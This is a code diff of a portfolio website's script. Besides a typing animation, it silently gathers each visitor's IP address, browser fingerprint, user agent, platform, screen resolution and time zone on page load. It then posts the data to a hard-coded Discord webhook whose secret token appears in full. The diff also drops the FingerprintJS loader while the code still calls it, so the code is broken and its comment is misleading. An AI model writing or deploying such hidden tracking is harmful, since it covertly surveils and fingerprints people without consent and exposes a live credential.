@@ -1,10 +1,5 @@
-<!-- ✅ Load FingerprintJS (open-source) -->
-<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-
-<!-- ✅ Your Script -->
-<script>
+// Typing Effect
 document.addEventListener("DOMContentLoaded", async () => {
-    // Typing Effect
     const textElement = document.getElementById("text");
     const textToType = "Welcome to My Portfolio!";
     const typingSpeed = 100;
@@ -24,25 +19,23 @@ document.addEventListener("DOMContentLoaded", async () => {
     typeCharacter();
 
     try {
-        // Step 1: Get IP address
+        // Step 1: Get IP
         const ipRes = await fetch("https://api64.ipify.org?format=json");
         const ipData = await ipRes.json();
         const ip = ipData.ip || "Unknown";
 
-        // Step 2: Get fingerprint
+        // Step 2: Load fingerprint.js (from CDN)
         const fp = await FingerprintJS.load();
         const result = await fp.get();
         const visitorId = result.visitorId || "Unknown";
 
-        // Step 3: Other data
         const browser = navigator.userAgent || "Unknown";
         const platform = navigator.platform || "Unknown";
         const screenRes = `${window.screen.width}x${window.screen.height}`;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
 
-        // Step 4: Send to Discord
+        // Step 3: Send to Discord
         const webhookUrl = "https://discord.com/api/webhooks/1385635781434937424/LRV8v5TBSzwJkNrdOtXWapcHYBI9UZTmqgFFIeQCHnt0zptn5Io1TA1kyzezcfkEBFEt";
-
         const message = {
             content: `📩 **New Visitor Logged**\n` +
                      `**IP Address:** ${ip}\n` +
@@ -66,4 +59,3 @@ document.addEventListener("DOMContentLoaded", async () => {
         console.error("Failed to collect/send visitor data:", err);
     }
 });
-</script>
